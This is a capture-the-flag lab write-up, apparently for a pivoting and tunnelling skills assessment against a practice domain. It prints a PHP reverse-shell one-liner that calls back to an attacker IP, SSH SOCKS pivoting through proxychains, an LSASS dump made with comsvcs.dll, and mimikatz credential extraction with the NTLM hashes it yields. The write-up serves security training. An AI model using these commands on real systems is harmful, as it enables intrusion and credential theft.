
# Scenario

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. 

We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:

# Objectives

- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.



# Questions

1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.

```sh
# Access the web shell
http://10.129.229.129/

# Get a reverse shell
php -r '$sock=fsockopen("10.10.15.242",4444);shell_exec("sh <&3 >&3 2>&3");'

# Stabilize the shell
python3 -c 'import pty; pty.spawn("/bin/bash")' 


# Start hunting for credentials. Here, note files
<find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/administrator
/home/webadmin
/home/webadmin/for-admin-eyes-only
find: ‘/home/webadmin/.cache’: Permission denied
find: ‘/home/webadmin/.ssh’: Permission denied
/home/webadmin/id_rsa


# Get the private key
cat /home/webadmin/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvm9BTps6LPw35+tXeFAw/WIB/ksNIvt5iN7WURdfFlcp+T3fBKZD
HaOQ1hl1+w/MnF+sO/K4DG6xdX+prGbTr/WLOoELCu+JneUZ3X8ajU/TWB3crYcniFUTgS
PupztxZpZT5UFjrOD10BSGm1HeI5m2aqcZaxvn4GtXtJTNNsgJXgftFgPQzaOP0iLU42Bn
IL/+PYNFsP4he27+1AOTNk+8UXDyNftayM/YBlTchv+QMGd9ojr0AwSJ9+eDGrF9jWWLTC
o9NgqVZO4izemWTqvTcA4pM8OYhtlrE0KqlnX4lDG93vU9CvwH+T7nG85HpH5QQ4vNl+vY
...
-----END OPENSSH PRIVATE KEY-----

# Save into a file
cat id_rsa
chmod 600 id_rsa


# Can we login?
ssh -i id_rsa webadmin@10.129.229.129


# Yes. And we see the files available in the folder. Read the file
cat /home/webadmin/for-admin-eyes-only

# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account: ******
with a password of : **********


# Situational awareness
ifconfig

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.129  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:342e  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:342e  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:34:2e  txqueuelen 1000  (Ethernet)
        RX packets 2579  bytes 210521 (210.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 681  bytes 57700 (57.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb0:f8fd  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:f8:fd  txqueuelen 1000  (Ethernet)
        RX packets 390  bytes 24965 (24.9 KB)
        RX errors 0  dropped 12  overruns 0  frame 0
        TX packets 23  bytes 1886 (1.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2062  bytes 162162 (162.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2062  bytes 162162 (162.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


2. Submit the credentials found in the user's home directory. (Format: user:password)

```sh
cat /home/webadmin/for-admin-eyes-only
```


3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.

```sh
# Assuming that the host we landed in is our pivot host. Enumerate using bash?
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 172.16.5.X: icmp_seq=1 ttl=128 time=5.04 ms

# The other ip is 
172.16.5.X
```


4. Use the information you gathered to pivot to the discovered host. Submit the contents of `C:\Flag.txt` as the answer.

```sh
# Assume that 172.16.5.35 is server01. Try to connect using the credentials gathered from the pivot host?
ssh -D 9050 ******@172.16.5.35

/etc/ssh/ssh_config: line 25: Bad configuration option: usepam
/etc/ssh/ssh_config line 27: Unsupported option "rsaauthentication"
/etc/ssh/ssh_config: terminating, 1 bad configuration options


# Failed. Try from the attacker machine with the private key. And that worked.
ssh -i id_rsa -D 9050 webadmin@10.129.229.129


# Seems like it worked? # Edit the proxychains config file to configure the proxy
tail -4 /etc/proxychains.conf


# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050


# Verify that we can access the internal network from our kali machine
proxychains nmap -v -Pn -sT 172.16.5.35 --top-ports 20

...
Nmap scan report for 172.16.5.35
Host is up.
...


# Now SSH or RDP? Per the question, looks like a windows machine. So RDP
proxychains xfreerdp /u:******* /p:'*********' /v:172.16.5.35 /size:80% +clipboard

# Worked? Yes. Read the flag
PS C:\> type .\Flag.txt
*************
```


5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?

```sh
# Situational awareness
whoami /all

...
BUILTIN\Administrators    Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
...


# Per the hint, We may be able to find something stored in LSASS. Dump it using GUI
RDP > Task Manager > Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

# File located at
C:\Users\mlefay\AppData\Local\Temp\lsass.DMP


# Using elevated powershell
Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1255      29     6548      44804       1.42    668   0 lsass


PS C:\Users> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 668 C:\lsass.dmp full

# Verify
 ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---         5/6/2022   2:30 AM                Program Files
d-----         5/6/2022   2:28 AM                Program Files (x86)
d-r---        5/17/2022  11:14 AM                Users
d-----        5/17/2022  11:10 AM                Windows
-a----        5/17/2022   8:41 AM             21 Flag.txt
-a----         5/4/2025   9:36 PM       45968240 lsass.dmp


# Transfer that to our Kali machine? Didn't find an easy way. So, had to revers to mimikatz. Download on Parrot
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip


# Transfer to Pivot host
python3 -m http.server 8000
wget http://10.10.15.242:8000/mimikatz_trunk.zip


# Then transfer to windows target
python3 -m http.server 8000 # Pivot
iwr -uri 172.16.5.15:8000/mimikatz_trunk.zip -OutFile mimikatz_trunk.zip


# Extract all the files into a folder
 .\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

# Dump
mimikatz # sekurlsa::logonpasswords


Authentication Id : 0 ; 1971470 (00000000:001e150e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/4/2025 9:26:09 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
        tspkg :
        wdigest :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : "z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#"
        ssp :
        credman :

Authentication Id : 0 ; 163007 (00000000:00027cbf)
Session           : Service from 0
User Name         : ****
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 5/4/2025 8:24:58 PM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : ****
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
        tspkg :
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : ****
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : ****
        ssp :
        credman :

Authentication Id : 0 ; 2001610 (00000000:001e8aca)
Session           : RemoteInteractive from 2
User Name         : ****
Domain            : PIVOT-SRV01
Logon Server      : PIVOT-SRV01
Logon Time        : 5/4/2025 9:26:10 PM
SID               : S-1-5-21-1602415334-2376822715-119304339-1003
        msv :
         [00000003] Primary
         * Username : ****
         * Domain   : PIVOT-SRV01
         * NTLM     : 2831bf1e4e0841d882328d5481fb5c92
         * SHA1     : ccb38ae19c47a04fa01542f30466d6c48ddc18d7
        tspkg :
        wdigest :
         * Username : mlefay
         * Domain   : PIVOT-SRV01
         * Password : (null)
        kerberos :
         * Username : mlefay
         * Domain   : PIVOT-SRV01
         * Password : (null)
        ssp :
        credman :
```


6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the `C:\Flag.txt` located on the workstation.

```sh
# Situational awareness. Completely forgot
PS C:\> ipconfig.exe

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5523:4a93:f468:aa5d%4
   IPv4 Address. . . . . . . . . . . : 172.16.5.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::c9b0:ca50:e34c:8701%5
   IPv4 Address. . . . . . . . . . . : 172.16.6.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :


# Enumerate Ping sweep using cmd on windows pivot hosts
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"

...
C:\Windows\system32>ping 172.16.6.22 -n 1 -w 100   | find "Reply"
C:\Windows\system32>ping 172.16.6.23 -n 1 -w 100   | find "Reply"
C:\Windows\system32>ping 172.16.6.24 -n 1 -w 100   | find "Reply"
C:\Windows\system32>ping 172.16.6.25 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.25: bytes=32 time=1ms TTL=128
...
C:\Windows\system32>ping 172.16.6.35 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128 # Current host
...
C:\Windows\system32>ping 172.16.6.45 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.45: bytes=32 time=2ms TTL=64


# Ping Sweep using powershell to confirm?
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)"}

# Powershell never returned a positive IP. Important to use multiple tools to ensure coverage.


# Confirm?
mstsc.exe

# Enter 
172.16.6.25 ****


# YEEEEEEEEEES!!!! We are in. Find the flag
****
```


7.  Submit the contents of `C:\Flag.txt` located on the Domain Controller.

```sh
# Situational awareness
hostname
PIVOTWIN10
PS C:\Users\vfrank>

# When you log into 172.16.6.25 as Frank, there's a shared drive named AutomateDCAdmin(Z:). Open it and find the flag.
****
```
